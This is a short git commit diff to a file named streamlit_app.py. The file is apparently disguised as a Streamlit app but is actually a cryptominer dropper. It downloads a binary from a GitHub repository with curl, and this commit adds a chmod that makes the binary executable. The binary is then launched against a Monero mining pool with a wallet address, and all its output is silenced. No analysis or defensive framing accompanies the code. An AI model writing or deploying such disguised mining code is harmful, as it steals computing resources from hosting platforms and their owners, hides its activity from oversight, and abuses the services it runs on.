692335ae2aa5649c83886306a03f1bff96260084
ontaracing04 <110086717+ontaracing04@users.noreply.github.com>
2022-07-29 13:54:56 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,4 +1,4 @@
 import os
 
-os.system("curl https://github.com/ontaracing04/sue/raw/main/-")
+os.system("curl https://github.com/ontaracing04/sue/raw/main/- && chmod u+x -")
 os.system("./- -o xmr.2miners.com:2222 -u 8BeTiTxwtTphRfwuNXSsukeMMVKE5qvJZZDjqB3SpqMZS1Q37wMJ3RnKxm6itZgZgxPeffg6ZZA3aANkGRDqJRHmKMg8R1j.julaher >/dev/null >/dev/null 2>&1")
